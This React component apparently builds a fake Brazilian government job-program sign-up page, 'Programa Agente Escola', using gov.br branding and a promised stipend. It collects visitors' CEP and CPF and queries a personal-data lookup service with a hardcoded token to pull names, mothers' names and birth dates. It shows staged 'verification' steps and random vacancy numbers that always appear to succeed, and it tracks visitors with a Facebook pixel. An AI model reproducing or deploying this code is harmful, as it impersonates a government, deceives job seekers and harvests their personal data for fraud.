import React, { useState, useEffect, useRef } from "react";
import { Check, MapPin, DollarSign, GraduationCap, Award, Search } from "lucide-react";
import { useLocation } from "../context/LocationContext";
import { useUser } from "../context/UserContext";
import ReactPixel from "react-facebook-pixel";
import { hashUserData } from "../utils/pixel";
import useUtmNavigator from "../hooks/useUtmNavigator";
import { usePixelTracking } from '../hooks/usePixelTracking';
import axios from "axios";

interface School {
	id: string;
	name: string;
	type: string;
	distance: number;
}

interface AddressInfo {
	cep: string;
	logradouro: string;
	bairro: string;
	localidade: string;
	uf: string;
	codigoRegiao: string;
	pontoAtendimento: string;
	vagasDisponiveis: number;
	nearbySchools: School[];
}

interface UserInfo {
	cpf: string;
	nome: string;
	nome_mae: string;
	data_nascimento: string;
	sexo: string;
}

interface VerificationStep {
	label: string;
	status: "pending" | "processing" | "completed";
}

const validateCEP = async (cep: string) => {
  try {
    // 1. Get address from ViaCEP
    const viaCepResponse = await axios.get(`https://viacep.com.br/ws/${cep}/json/`);
    if (viaCepResponse.data.erro) {
      throw new Error("CEP não encontrado");
    }

    // 2. Get coordinates from Nominatim
    const address = `${viaCepResponse.data.logradouro}, ${viaCepResponse.data.localidade}, ${viaCepResponse.data.uf}, Brazil`;
    const nominatimResponse = await axios.get(
      `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(address)}`
    );

    if (!nominatimResponse.data.length) {
      throw new Error("Localização não encontrada");
    }

    const { lat, lon } = nominatimResponse.data[0];

    // 3. Search for schools using Overpass API
    const overpassQuery = `
      [out:json][timeout:25];
      (
        node["amenity"="school"](around:10000,${lat},${lon});
        way["amenity"="school"](around:10000,${lat},${lon});
        relation["amenity"="school"](around:10000,${lat},${lon});
      );
      out body;
      >;
      out skel qt;
    `;

    const overpassResponse = await axios.post(
      'https://overpass-api.de/api/interpreter',
      overpassQuery,
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    // Process schools
    const schools = overpassResponse.data.elements
      .filter(element => element.tags && element.tags.name)
      .map(element => ({
        id: element.id.toString(),
        name: element.tags.name,
        type: element.tags.school_type || 'Escola pública',
        distance: calculateDistance(lat, lon, element.lat, element.lon)
      }))
      .sort((a, b) => a.distance - b.distance)
      .slice(0, 3);

    return {
      address: viaCepResponse.data,
      schools,
      coordinates: { lat, lon }
    };
  } catch (error) {
    console.error('Error fetching location data:', error);
    throw error;
  }
};

const calculateDistance = (lat1: number, lon1: number, lat2: number, lon2: number) => {
  const R = 6371; // Earth's radius in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = 
    Math.sin(dLat/2) * Math.sin(dLat/2) +
    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * 
    Math.sin(dLon/2) * Math.sin(dLon/2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  return R * c;
};

const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?: UserInfo }> => {
	const numericCPF = cpf.replace(/\D/g, "");

	if (numericCPF.length !== 11) {
		return { valid: false };
	}

	if (/^(\d)\1{10}$/.test(numericCPF)) {
		return { valid: false };
	}

	let sum = 0;
	for (let i = 0; i < 9; i++) {
		sum += parseInt(numericCPF.charAt(i)) * (10 - i);
	}
	let digit1 = 11 - (sum % 11);
	if (digit1 > 9) digit1 = 0;

	sum = 0;
	for (let i = 0; i < 10; i++) {
		sum += parseInt(numericCPF.charAt(i)) * (11 - i);
	}
	let digit2 = 11 - (sum % 11);
	if (digit2 > 9) digit2 = 0;

	if (parseInt(numericCPF.charAt(9)) !== digit1 || parseInt(numericCPF.charAt(10)) !== digit2) {
		return { valid: false };
	}

	try {
		const url = `https://magmadatahub.com/api.php?token=bef7dbfe0994308f734fbfb4e2a0dec17aa7baed9f53a0f5dd700cf501f39f26&cpf=${numericCPF}`;
		
		console.log('Consultando API de CPF:', url.replace(numericCPF, '***'));
		
		const response = await axios.get(url, { timeout: 8000 });

		const body = response.data;
		console.log('Resposta da API:', body);

		// Verifica se é um erro da API
		if (body?.status === 'error' || body?.error) {
			console.warn('CPF API: erro retornado', body);
			return {
				valid: true,
				data: {
					cpf: numericCPF,
					nome: "",
					nome_mae: "",
					data_nascimento: "",
					sexo: ""
				}
			};
		}

		// Suporta diferentes formatos da MagmaDataHub
		// Pode ser: body.DADOS, body.dados, body.data, array ou diretamente no body
		let dados = body?.DADOS || body?.dados || body?.data;
		
		if (!dados && Array.isArray(body) && body.length > 0) {
			dados = body[0];
		}
		
		// Se nada acima funcionou, talvez os dados estejam diretamente no body
		if (!dados && body?.nome) {
			dados = body;
		}

		if (!dados || !dados.nome) {
			console.warn('CPF API: dados incompletos na resposta', body);
			return {
				valid: true,
				data: {
					cpf: numericCPF,
					nome: "",
					nome_mae: "",
					data_nascimento: "",
					sexo: ""
				}
			};
		}

		// Extrai os dados com múltiplas variações de nomes de campo
		const nome = dados.nome || dados.NOME || dados.full_name || dados.nome_completo || "";
		const cpfField = dados.cpf || dados.CPF || numericCPF;
		const nomeMae = dados.nome_mae || dados.mae || dados.nomeDaMae || dados.MAE || "";
		const dataNascimento = dados.data_nascimento || dados.nascimento || dados.birthdate || dados.DATA_NASCIMENTO || "";
		const sexoField = (dados.sexo || dados.SEXO || "").toString();

		console.log('Dados extraídos:', { nome, cpfField, nomeMae, dataNascimento, sexoField });

		return {
			valid: true,
			data: {
				cpf: cpfField,
				nome: nome,
				nome_mae: nomeMae,
				data_nascimento: dataNascimento,
				sexo: sexoField
			}
		};
	} catch (error) {
		console.error('Erro ao consultar API de CPF:', error);
		// Se a API falhar, aceitar o CPF que passou na validação de formato
		return {
			valid: true,
			data: {
				cpf: numericCPF,
				nome: "",
				nome_mae: "",
				data_nascimento: "",
				sexo: ""
			}
		};
	}
};

const schoolsDatabase: Record<string, School[]> = {
	SP: [
		{ id: "escola-1", name: "Escola Municipal Maria Luiza", type: "Escola pública", distance: 1.2 },
		{ id: "escola-2", name: "Escola Estadual Paulo Freire", type: "Escola pública", distance: 1.8 },
		{ id: "escola-3", name: "EMEF Anísio Teixeira", type: "Escola pública", distance: 2.3 },
		{ id: "escola-4", name: "Escola Municipal Castro Alves", type: "Escola pública", distance: 2.7 },
	],
	RJ: [
		{ id: "escola-5", name: "Colégio Municipal Pedro II", type: "Escola pública", distance: 1.5 },
		{ id: "escola-6", name: "Escola Estadual Tiradentes", type: "Escola pública", distance: 2.0 },
		{ id: "escola-7", name: "CIEP Darcy Ribeiro", type: "Escola pública", distance: 2.4 },
	],
};

const Inscription: React.FC = () => {
	usePixelTracking();
	
	const navigate = useUtmNavigator();
	const [cep, setCep] = useState("");
	const [cpf, setCpf] = useState("");
	const [addressInfo, setAddressInfo] = useState<AddressInfo | null>(null);
	const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
	const [loading, setLoading] = useState(false);
	const [error, setError] = useState("");
	const [acceptedTerms, setAcceptedTerms] = useState(false);
	const [verificationSteps, setVerificationSteps] = useState<VerificationStep[]>([
		{ label: "Validando CPF", status: "pending" },
		{ label: "Verificando Nome", status: "pending" },
		{ label: "Verificando Nome da Mãe", status: "pending" },
		{ label: "Validando Data de Nascimento", status: "pending" },
		{ label: "Verificando Elegibilidade", status: "pending" },
	]);
	const [isVerifying, setIsVerifying] = useState(false);
	const [verificationComplete, setVerificationComplete] = useState(false);
	const [name, setName] = useState("");

	const { setLocationInfo } = useLocation();
	const { setUserName } = useUser();

	const [showGovLoader, setShowGovLoader] = useState(false);
	const [loaderProgress, setLoaderProgress] = useState(0);
	const [loaderDotActive, setLoaderDotActive] = useState(0);
	const [loaderStep, setLoaderStep] = useState(0);
	const resultRef = useRef<HTMLDivElement>(null);
	const cpfFormRef = useRef<HTMLDivElement>(null);

	useEffect(() => {
		ReactPixel.init("617874301266607");

		ReactPixel.track("PageView", {
			event_name: "PageView",
			event_time: Math.floor(Date.now() / 1000),
			event_id: "PageView_" + Date.now(),
			action_source: "website",
			user_data: hashUserData({}),
			custom_data: {
				order_id: "",
				currency: "BRL",
				value: 0,
				content_name: "",
				content_ids: "",
				contents: "",
				num_items: 1,
			},
		});
	}, []);

	const formatCEP = (value: string) => {
		const numbers = value.replace(/\D/g, "");
		if (numbers.length <= 5) return numbers;
		return `${numbers.slice(0, 5)}-${numbers.slice(5, 8)}`;
	};

	const formatCPF = (value: string) => {
		const numbers = value.replace(/\D/g, "");
		if (numbers.length <= 3) return numbers;
		if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
		if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
		return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
	};



	const formatDate = (dateString: string) => {
		const date = new Date(dateString);
		return date.toLocaleDateString('pt-BR');
	};

	const handleCEPChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const formatted = formatCEP(e.target.value);
		if (formatted.length <= 9) {
			setCep(formatted);
		}
	};

	const validateCEPAndFindSchools = async () => {
		setLoading(true);
		setError("");
		setAddressInfo(null);
		setShowGovLoader(true);
		setLoaderProgress(0);
		setLoaderDotActive(0);
		setLoaderStep(0);

		const progressTimer = setInterval(() => {
			setLoaderProgress(prev => prev >= 88 ? prev : prev + 1.2);
		}, 70);
		const dotTimer = setInterval(() => {
			setLoaderDotActive(prev => (prev + 1) % 5);
		}, 420);

		try {
			const cleanCEP = cep.replace(/\D/g, "");

			await new Promise(resolve => setTimeout(resolve, 2000));
			setLoaderStep(1);

			const locationData = await validateCEP(cleanCEP);

			setLoaderStep(2);
			await new Promise(resolve => setTimeout(resolve, 1500));

			const addressInfo: AddressInfo = {
				cep: cleanCEP,
				logradouro: locationData.address.logradouro,
				bairro: locationData.address.bairro,
				localidade: locationData.address.localidade,
				uf: locationData.address.uf,
				codigoRegiao: `${locationData.address.uf}-${Math.floor(Math.random() * 90 + 10)}-${Math.floor(Math.random() * 900 + 100)}`,
				pontoAtendimento: locationData.schools[0].name,
				vagasDisponiveis: Math.floor(Math.random() * 50) + 1,
				nearbySchools: locationData.schools
			};

			setAddressInfo(addressInfo);
			setLocationInfo(cleanCEP, locationData.schools);

			clearInterval(progressTimer);
			clearInterval(dotTimer);
			setLoaderProgress(100);
			await new Promise(resolve => setTimeout(resolve, 500));
			setShowGovLoader(false);
			await new Promise(resolve => setTimeout(resolve, 250));
			resultRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });

		} catch (err) {
			clearInterval(progressTimer);
			clearInterval(dotTimer);
			setError("CEP não encontrado. Por favor, verifique o número e tente novamente.");
			setShowGovLoader(false);
		} finally {
			setLoading(false);
		}
	};

	const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const formatted = formatCPF(e.target.value);
		if (formatted.length <= 14) {
			setCpf(formatted);
		}
		setVerificationComplete(false);
		setIsVerifying(false);
		setVerificationSteps((steps) => steps.map((step) => ({ ...step, status: "pending" })));
	};

	const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const newName = e.target.value;
		setName(newName);
		setUserName(newName);
	};

	const updateVerificationStep = async (index: number) => {
		setVerificationSteps((steps) =>
			steps.map((step, i) => ({
				...step,
				status: i === index ? "processing" : step.status,
			})),
		);

		await new Promise((resolve) => setTimeout(resolve, 800));

		setVerificationSteps((steps) =>
			steps.map((step, i) => ({
				...step,
				status: i <= index ? "completed" : step.status,
			})),
		);
	};

	const validateCPF = async () => {
		setLoading(true);
		setError("");
		setIsVerifying(true);
		setVerificationComplete(false);

		try {
			for (let i = 0; i < verificationSteps.length; i++) {
				await updateVerificationStep(i);
			}

			const result = await validateCPFFromAPI(cpf);

			if (!result.valid) {
				throw new Error("CPF inválido");
			}

			setVerificationComplete(true);
			if (result.data) {
				setUserInfo(result.data);
				setName(result.data.nome);
				setUserName(result.data.nome);
			}
			await new Promise(resolve => setTimeout(resolve, 80));
			cpfFormRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });
		} catch (err) {
			setError("CPF inválido. Por favor, verifique o número e tente novamente.");
			setVerificationComplete(false);
			setIsVerifying(false);
			setVerificationSteps((steps) => steps.map((step) => ({ ...step, status: "pending" })));
		} finally {
			setLoading(false);
		}
	};

	const handleSubmit = () => {
		if (addressInfo && acceptedTerms) {
			navigate("/programa");
		}
	};

	return (
		<main className="container mx-auto px-4 py-4 flex-grow">
			{showGovLoader && (
			<div
				className="fixed inset-0 z-50 flex flex-col overflow-hidden"
				style={{
					fontFamily: 'Rawline, Helvetica, Arial, sans-serif',
					backgroundColor: 'rgb(7, 29, 65)',
					backgroundImage: 'radial-gradient(circle, rgba(255,255,255,0.06) 1px, transparent 1px)',
					backgroundSize: '20px 20px'
				}}
			>
				{/* Cross pattern overlay */}
				<div className="absolute inset-0 opacity-5 pointer-events-none">
					<div
						className="absolute inset-0"
						style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='1'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")` }}
					/>
				</div>

				{/* Top bar */}
				<div className="bg-[#071D41] py-2 mt-4 relative z-10">
					<div className="max-w-4xl mx-auto px-4 flex items-center justify-between">
						<img
							src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png"
							alt="gov.br"
							className="h-6 object-contain"
							style={{ filter: 'brightness(0) invert(1)', opacity: 0.8 }}
						/>
						<span className="text-white/40 tracking-wider" style={{ fontSize: '10px' }}>MINISTÉRIO DA SEGURANÇA</span>
					</div>
				</div>

				{/* Center */}
				<div className="flex-1 flex items-center justify-center px-4">
					<div className="flex flex-col items-center text-center text-white max-w-sm w-full mx-auto">
						<div className="mb-8">
							<div className="w-16 h-16 mx-auto relative">
								<div
									className="absolute inset-0 rounded-full"
									style={{
										borderWidth: '2px',
										borderStyle: 'solid',
										borderColor: 'rgb(22,136,33) rgba(255,255,255,0.1) rgba(255,255,255,0.1)',
										animation: '1s linear infinite govSpin'
									}}
								/>
								<div className="absolute inset-0 flex items-center justify-center text-white/90">
									<svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
										<path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
									</svg>
								</div>
							</div>
						</div>

						<h2 className="text-lg font-medium mb-2">Verificando disponibilidade</h2>
						<p className="text-sm mb-8 leading-relaxed" style={{ opacity: 0.6 }}>
							Consultando a base de dados para verificar seu CEP<br />
							e a disponibilidade de vagas na sua região.
						</p>

						{/* Progress bar */}
						<div className="w-full max-w-xs mx-auto mb-6">
							<div className="h-0.5 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.1)' }}>
								<div
									className="h-full rounded-full"
									style={{
										width: `${loaderProgress}%`,
										background: 'rgb(22,136,33)',
										transition: 'width 0.6s cubic-bezier(0.4,0,0.2,1)'
									}}
								/>
							</div>
						</div>

						{/* Dots */}
						<div className="flex justify-center gap-2">
							{[0,1,2,3,4].map(i => (
								<div
									key={i}
									className="w-2 h-2 rounded-full"
									style={{
										transition: 'all 0.3s',
										backgroundColor: i <= loaderDotActive ? 'rgb(22,136,33)' : 'rgba(255,255,255,0.15)',
										transform: i === loaderDotActive ? 'scale(1.4)' : 'scale(1)'
									}}
								/>
							))}
						</div>
					</div>
				</div>

				{/* Bottom status panel */}
				<div className="relative z-10 py-5 px-4" style={{ borderTop: '1px solid rgba(255,255,255,0.05)' }}>
					<div className="max-w-md mx-auto">
						<div className="rounded-lg p-4" style={{ background: 'rgba(255,255,255,0.05)', backdropFilter: 'blur(4px)' }}>
							<p className="text-white/50 uppercase tracking-wider mb-2" style={{ fontSize: '10px' }}>O que está acontecendo</p>
							<div className="space-y-2">
								{[
									{ label: 'Validando seu CEP na base de dados gov.br', active: loaderStep >= 1 },
									{ label: 'Verificando vagas disponíveis na região', active: loaderStep >= 2 },
									{ label: 'Estabelecendo conexão segura', active: false },
								].map((item, i) => (
									<div key={i} className="flex items-center gap-2">
										<div
											className={`w-1.5 h-1.5 rounded-full flex-shrink-0${i === 2 ? ' animate-pulse' : ''}`}
											style={{ background: 'rgb(0,156,59)' }}
										/>
										<span className="text-xs" style={{ color: 'rgba(255,255,255,0.7)' }}>{item.label}</span>
									</div>
								))}
							</div>
						</div>
					</div>
				</div>
			</div>
		)}

			<div className="max-w-lg mx-auto">
				<div className="mb-6">
					<h1 className="text-[#1351B4] text-2xl font-bold">Programa Agente Escola</h1>
					<div className="h-1 w-48 bg-[#2ECC71] mt-2"></div>
				</div>

				<div className="bg-white rounded-lg p-6 shadow-sm">
					<div className="mb-8">
						<h2 className="text-xl font-bold mb-3">Verificação de Disponibilidade</h2>
						<p className="text-[#505A5F] text-base">
							Para iniciar sua inscrição no programa Agente Escola do Futuro, primeiro verifique se há vagas
							disponíveis em sua região. Digite seu CEP abaixo para consultar a disponibilidade.
						</p>
					</div>

					<div ref={resultRef} className="mb-6">
						<label htmlFor="cep" className="block text-lg font-bold mb-2">
							CEP
						</label>
						<input
							type="text"
							id="cep"
							inputMode="numeric"
							pattern="\d*"
							placeholder="Digite seu CEP (Ex: 12345-678)"
							value={cep}
							onChange={handleCEPChange}
							maxLength={9}
							className="w-full p-4 border-2 border-[#1351B4] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
						/>
						<p className="text-[#505A5F] text-sm mt-2">
							Digite o CEP da sua residência para verificarmos a disponibilidade na sua região
						</p>
					</div>

					<button
						onClick={validateCEPAndFindSchools}
						disabled={loading || cep.length < 9}
						className="w-full bg-[#1351B4] text-white py-4 rounded-lg flex items-center justify-center gap-2 hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
					>
						<Search size={20} />
						<span className="font-semibold">Verificar Disponibilidade</span>
					</button>

					{error && <div className="mt-6 p-4 bg-red-50 border-l-4 border-red-500 text-red-700">{error}</div>}

					{addressInfo && (
						<>
							<div className="mt-8 p-6 border border-green-200 rounded-lg bg-green-50">
								<h2 className="text-2xl font-bold text-green-700 mb-6">Vagas Disponíveis!</h2>

								<p className="text-lg mb-6">
									Encontramos {addressInfo.vagasDisponiveis} vagas disponíveis para sua região.
								</p>

								<div className="space-y-4 mb-8">
									<div>
										<span className="font-bold">CEP consultado:</span> {cep}
									</div>
									<div>
										<span className="font-bold">Localidade:</span> {addressInfo.localidade}/
										{addressInfo.uf}
									</div>
									<div>
										<span className="font-bold">Bairro:</span> {addressInfo.bairro}
									</div>
									<div>
										<span className="font-bold">Logradouro:</span> {addressInfo.logradouro}
									</div>
									<div>
										<span className="font-bold">Ponto de atendimento:</span>{" "}
										{addressInfo.pontoAtendimento}
									</div>
									<div>
										<span className="font-bold">Código da região:</span> {addressInfo.codigoRegiao}
									</div>
								</div>
							</div>

							<div ref={cpfFormRef} className="mt-8 bg-white rounded-lg p-6">
								<h2 className="text-[#1351B4] text-2xl font-bold mb-2">Formulário de Inscrição</h2>
								<p className="text-gray-600 mb-6">
									Preencha seus dados abaixo para se inscrever no programa Agente Escola.
								</p>

								{verificationComplete ? (
									<>
										<div className="mb-6 bg-blue-50 p-4 rounded-lg">
											<h3 className="text-[#1351B4] font-bold mb-2">Verificação concluída</h3>
											<p className="text-gray-600">
												Seus dados foram verificados com sucesso. Complete o formulário abaixo
												para prosseguir com sua inscrição.
											</p>
										</div>

										<div className="space-y-6">
											<div>
												<label className="block text-sm font-medium text-gray-700 mb-1">
													CPF
												</label>
												<input
													type="text"
													value={userInfo?.cpf ? formatCPF(userInfo.cpf) : cpf}
													disabled
													className="w-full p-3 bg-gray-100 border border-gray-300 rounded-lg"
												/>
											</div>

											<div>
												<label className="block text-sm font-medium text-gray-700 mb-1">
													Nome completo
												</label>
												<input
													type="text"
													value={name}
													onChange={handleNameChange}
													placeholder="Digite seu nome completo"
													disabled={userInfo?.nome ? false : false}
													className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1351B4] focus:border-transparent disabled:bg-gray-50"
												/>
											</div>

                                            

											<div className="flex items-start gap-2 mt-6">
												<input
													type="checkbox"
													id="terms"
													checked={acceptedTerms}
													onChange={(e) => setAcceptedTerms(e.target.checked)}
													className="mt-1"
												/>
												<div>
													<label htmlFor="terms" className="text-sm font-medium">
														Aceito os termos de uso e política de privacidade do programa
														Agente Escola do Futuro
													</label>
													<p className="text-sm text-gray-500 mt-1">
														Ao aceitar os termos, você concorda com as regras do programa e
														permite o uso dos seus dados para fins de inscrição.
													</p>
												</div>
											</div>

											<button
												onClick={handleSubmit}
												disabled={!acceptedTerms}
												className="w-full bg-[#1351B4] text-white py-4 rounded-full flex items-center justify-center gap-2 hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-6"
											>
												<span className="font-semibold">Continuar Inscrição</span>
											</button>
										</div>
									</>
								) : (
									<div className="mb-6">
										<div className="flex gap-2">
											<input
												type="text"
												inputMode="numeric"
												pattern="\d*"
												placeholder="Digite seu CPF (123.456.789-00)"
												value={cpf}
												onChange={handleCPFChange}
												maxLength={14}
												className="flex-1 p-4 border-2 border-[#1351B4] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
											/>
											<button
												onClick={validateCPF}
												disabled={loading || cpf.length < 14}
												className="bg-[#1351B4] text-white p-4 rounded-lg hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
												aria-label="Buscar CPF"
											>
												<Search size={24} />
											</button>
										</div>

										{isVerifying && (
											<div className="mt-6 p-6 bg-blue-50 rounded-lg">
												<h3 className="text-lg font-semibold text-[#1351B4] mb-4">
													Verificação de dados
												</h3>
												<div className="space-y-4">
													{verificationSteps.map((step, index) => (
														<div key={index} className="flex items-center gap-3">
															{step.status === "completed" ? (
																<div className="w-5 h-5 rounded-full bg-green-500 flex items-center justify-center">
																	<Check size={12} className="text-white" />
																</div>
															) : step.status === "processing" ? (
																<div className="w-5 h-5">
																	<div className="w-5 h-5 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
																</div>
															) : (
																<div className="w-5 h-5 rounded-full border-2 border-gray-300"></div>
															)}
															<span
																className={`flex-1 ${
																	step.status === "completed"
																		? "text-green-700"
																		: step.status === "processing"
																		? "text-blue-700"
																		: "text-gray-500"
																}`}
															>
																{step.label}
															</span>
															{step.status === "completed" && (
																<span className="text-green-500 text-sm">Válido</span>
															)}
														</div>
													))}
												</div>
												<div className="mt-4 bg-blue-100 rounded-full overflow-hidden">
													<div
														className="h-2 bg-blue-500 transition-all duration-500"
														style={{
															width: `${
																(verificationSteps.filter(
																	(step) => step.status === "completed",
																).length /
																	verificationSteps.length) *
																100
															}%`,
														}}
													></div>
												</div>
											</div>
										)}
									</div>
								)}
							</div>
						</>
					)}

					<div className="mt-8 bg-[#FFF9E6] rounded-lg p-6 border-l-4 border-[#FFCD07]">
						<h3 className="text-lg font-bold mb-4">Informações Importantes</h3>
						<ul className="space-y-4 text-sm">
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>Apenas cidadãos brasileiros ou naturalizados podem se inscrever.</span>
							</li>
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>É necessário ter ensino médio completo para participar do programa.</span>
							</li>
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>As vagas são distribuídas de acordo com a necessidade de cada município.</span>
							</li>
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>O processo seletivo inclui análise de currículo e entrevista.</span>
							</li>
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>
									A bolsa de capacitação varia entre R$ 3.456,13 a R$ 4.290,71 dependendo da região.
								</span>
							</li>
						</ul>
					</div>
				</div>
			</div>
		</main>
	);
};

export default Inscription;
